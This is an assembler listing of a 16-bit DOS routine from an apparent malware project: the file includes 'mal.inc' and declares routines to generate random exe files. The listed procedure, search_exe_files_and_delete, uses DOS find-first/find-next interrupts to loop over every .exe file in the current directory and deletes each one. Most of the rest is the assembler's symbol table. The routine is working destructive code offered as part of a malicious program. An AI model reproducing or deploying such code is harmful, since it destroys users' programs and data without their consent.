Microsoft (R) Macro Assembler Version 6.15.8803		    12/07/19 18:21:34
_search_and_delete.asm					     Page 1 - 1


				INCLUDE mal.inc
			      C .NOLIST
			      C 
			      C 
			      C 
			      C search_exe_files_and_delete PROTO, ptrDTA:PTR BYTE, ptrDEL:PTR BYTE
			      C 
			      C delete_file PROTO
			      C 
			      C generate_random_exe_files PROTO, RAND:BYTE, rand_file_size:BYTE, ptrRAND:PTR BYTE
			      C 
			      C create_file PROTO
			      C 
			      C close_file PROTO
			      C .LIST
			      C 

 0000				.code
 0000					search_exe_files_and_delete PROC, ptrDTA:PTR BYTE, ptrDEL:PTR BYTE
					
					;Requires generic pattern for exe files to be declared in files variable
					;Uses dx, ah, cx registers and delete_file function
					;Sets manual DTA defined in .data
					;Searches all of the exe files in the current directory and deletes them
					
 0003  8B 56 04					mov dx, ptrDTA
 0006  B4 1A					mov ah, 1Ah     	;Setting Disk Transfer Address to 128 bytes
 0008  CD 21					int 21h				;DTA is used for 4Eh and 4Fh
					
 000A  B4 4E					mov ah, 4Eh			;Find first file in this case *.exe file, * is wildcard 
 000C  B9 0000					mov cx, 00h			;Attribute is 00h	
 000F  8B 56 06					mov dx, ptrDEL
 0012  CD 21					int 21h
 0014  72 17					JC quit				;If carry is set either File is not found or No more files
						
 0016  8B 56 22					mov dx, ptrDTA+30	;File name is present at offset 30 of DTA,attribute,time stamps etc are present before offset 30
						INVOKE delete_file
						
 001C						search_files:
 001C  B4 4F						mov ah, 4Fh		;Find next file,DTA must point at a data record set up by Find first file interrupt
 001E  B9 0000						mov cx, 00h		;Attribute is 00h read-only
 0021  CD 21						int 21h
 0023  72 08						JC quit			;If carry is set then there aren't any more files ax will have 18	
							
 0025  8B 56 22						mov dx, ptrDTA+30	;Next file name is at 30 offset of DTA
							INVOKE delete_file		;.exe file is already present in dx
 002B  EB EF						JMP search_files		;Keep searching files
						
 002D						quit:
						
						ret
						
 0031					search_exe_files_and_delete ENDP

				END
Microsoft (R) Macro Assembler Version 6.15.8803		    12/07/19 18:21:34
_search_and_delete.asm					     Symbols 2 - 1




Macros:

                N a m e                 Type

startup  . . . . . . . . . . . .	Proc


Structures and Unions:

                N a m e                  Size
                                         Offset      Type

ExtGetDskFreSpcStruc . . . . . .	 002C
  StructSize . . . . . . . . . .	 0000	     Word
  Level  . . . . . . . . . . . .	 0002	     Word
  SectorsPerCluster  . . . . . .	 0004	     DWord
  BytesPerSector . . . . . . . .	 0008	     DWord
  AvailableClusters  . . . . . .	 000C	     DWord
  TotalClusters  . . . . . . . .	 0010	     DWord
  AvailablePhysSectors . . . . .	 0014	     DWord
  TotalPhysSectors . . . . . . .	 0018	     DWord
  AvailableAllocationUnits . . .	 001C	     DWord
  TotalAllocationUnits . . . . .	 0020	     DWord
  Rsvd . . . . . . . . . . . . .	 0024	     DWord
TimeRecord . . . . . . . . . . .	 0004
  hours  . . . . . . . . . . . .	 0000	     Byte
  minutes  . . . . . . . . . . .	 0001	     Byte
  seconds  . . . . . . . . . . .	 0002	     Byte
  hhss . . . . . . . . . . . . .	 0003	     Byte


Segments and Groups:

                N a m e                 Size     Length   Align   Combine Class

DGROUP . . . . . . . . . . . . .	GROUP
_DATA  . . . . . . . . . . . . .	16 Bit	 0000	  Word	  Public  'DATA'	
STACK  . . . . . . . . . . . . .	16 Bit	 1000	  Para	  Stack	  'STACK'	 
_TEXT  . . . . . . . . . . . . .	16 Bit	 0031	  Word	  Public  'CODE'	


Procedures,  parameters and locals:

                N a m e                 Type     Value    Attr

ClrScr . . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Crlf . . . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Delay  . . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
DumpMem  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
DumpRegs . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Get_Commandtail  . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Get_Time . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Gotoxy . . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
IsDigit  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Random32 . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
RandomRange  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Randomize  . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
ReadChar . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
ReadHex  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
ReadInt  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
ReadString . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_compare  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_copy . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_length . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_trim . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_ucase  . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WaitMsg  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteBin . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteChar  . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteDec . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteHex . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteInt . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteString  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
close_file . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
create_file  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
delete_file  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
generate_random_exe_files  . . .	P Near	 0000	  Length= 0000 External STDCALL
search_exe_files_and_delete  . .	P Near	 0000	  _TEXT	Length= 0031 Public STDCALL
  ptrDTA . . . . . . . . . . . .	Word	 bp + 0004
  ptrDEL . . . . . . . . . . . .	Word	 bp + 0006
  search_files . . . . . . . . .	L Near	 001C	  _TEXT	
  quit . . . . . . . . . . . . .	L Near	 002D	  _TEXT	


Symbols:

                N a m e                 Type     Value    Attr

@CodeSize  . . . . . . . . . . .	Number	 0000h	 
@DataSize  . . . . . . . . . . .	Number	 0000h	 
@Interface . . . . . . . . . . .	Number	 0003h	 
@Model . . . . . . . . . . . . .	Number	 0002h	 
@cmdline . . . . . . . . . . . .	Text   	 OFFSET __98765765cmdline
@code  . . . . . . . . . . . . .	Text   	 _TEXT
@data  . . . . . . . . . . . . .	Text   	 DGROUP
@fardata?  . . . . . . . . . . .	Text   	 FAR_BSS
@fardata . . . . . . . . . . . .	Text   	 FAR_DATA
@stack . . . . . . . . . . . . .	Text   	 DGROUP
black  . . . . . . . . . . . . .	Number	 0000h	 
blue . . . . . . . . . . . . . .	Number	 0001h	 
brown  . . . . . . . . . . . . .	Number	 0006h	 
cyan . . . . . . . . . . . . . .	Number	 0003h	 
exit . . . . . . . . . . . . . .	Text   	 .EXIT
gray . . . . . . . . . . . . . .	Number	 0008h	 
green  . . . . . . . . . . . . .	Number	 0002h	 
lightBlue  . . . . . . . . . . .	Number	 0009h	 
lightCyan  . . . . . . . . . . .	Number	 000Bh	 
lightGray  . . . . . . . . . . .	Number	 0007h	 
lightGreen . . . . . . . . . . .	Number	 000Ah	 
lightMagenta . . . . . . . . . .	Number	 000Dh	 
lightRed . . . . . . . . . . . .	Number	 000Ch	 
magenta  . . . . . . . . . . . .	Number	 0005h	 
red  . . . . . . . . . . . . . .	Number	 0004h	 
white  . . . . . . . . . . . . .	Number	 000Fh	 
yellow . . . . . . . . . . . . .	Number	 000Eh	 

	   0 Warnings
	   0 Errors
